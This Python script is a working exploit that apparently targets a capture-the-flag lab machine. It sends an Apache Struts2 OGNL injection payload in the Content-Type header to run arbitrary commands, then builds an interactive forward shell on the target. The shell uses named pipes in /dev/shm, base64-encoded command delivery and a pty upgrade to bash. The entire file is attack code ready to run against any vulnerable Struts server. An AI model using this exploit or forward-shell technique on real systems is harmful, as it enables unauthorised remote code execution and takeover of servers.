#!/usr/bin/env python
# -*- coding: utf-8 -*-

# Usage: python3 StratosphereFwdShell.py

import urllib.request as urllib2
import http.client as httplib
# _import socket

import base64
import random
import threading
import time


class Stratosphere:

	URL = r'http://10.10.10.64/Monitoring/example/Welcome.action'

	def __init__(self, interval=1.3):
		self.url = Stratosphere.URL

		session = random.randrange(10000, 99999)
		self.stdin = f'/dev/shm/input.{session}'
		self.stdout = f'/dev/shm/output.{session}'
		print(f'[*] Session ID: {session}')

		# Setting up shell
		print('[*] Setting up forward shell on target')
		createNamedPipes = f'mkfifo {self.stdin}; tail -f {self.stdin} | /bin/sh > {self.stdout} 2>&1'
		self.runRawCmd(createNamedPipes, timeout=0.5)

		# Setting up read thread
		print('[*] Setting up read thread')
		self.interval = interval
		thread = threading.Thread(target=self.readThread, args=())
		thread.daemon = True
		thread.start()

	def readThread(self):
		getOutput = f'/bin/cat {self.stdout}'
		while True:
			result = self.runRawCmd(getOutput).decode('utf-8')
			if result:
				print(result)
				clearOutput = f'echo -n "" > {self.stdout}'
				self.runRawCmd(clearOutput)
			time.sleep(self.interval)

	# Source: https://www.exploit-db.com/exploits/41570
	def runRawCmd(self, cmd, timeout=50):
		payload = "%{(#_='multipart/form-data')."
		payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
		payload += "(#_memberAccess?"
		payload += "(#_memberAccess=#dm):"
		payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
		payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
		payload += "(#ognlUtil.getExcludedPackageNames().clear())."
		payload += "(#ognlUtil.getExcludedClasses().clear())."
		payload += "(#context.setMemberAccess(#dm))))."
		payload += "(#cmd='%s')." % cmd
		payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
		payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
		payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
		payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
		payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
		payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
		payload += "(#ros.flush())}"

		headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
		request = urllib2.Request(self.url, headers=headers)

		try:
			return urllib2.urlopen(request, timeout=timeout).read()
		except httplib.IncompleteRead as e:
			return e.partial
		except: # _socket.timeout:
			pass

	def writeCmd(self, cmd):
		b64Cmd = base64.b64encode(f'{cmd.rstrip()}\n'.encode('utf-8')).decode('utf-8')
		unwrapAndExec = f'base64 -d <<< {b64Cmd} > {self.stdin}'
		self.runRawCmd(unwrapAndExec)
		time.sleep(self.interval * 1.1)

	def upgradeShell(self):
		upgradeShell = """python3 -c 'import pty; pty.spawn("/bin/bash")'"""
		self.writeCmd(upgradeShell)


prompt = 'stratosphere> '
S = Stratosphere()

while True:
	cmd = input(prompt)
	if cmd == 'upgrade':
		prompt = ''
		S.upgradeShell()
	else:
		S.writeCmd(cmd)
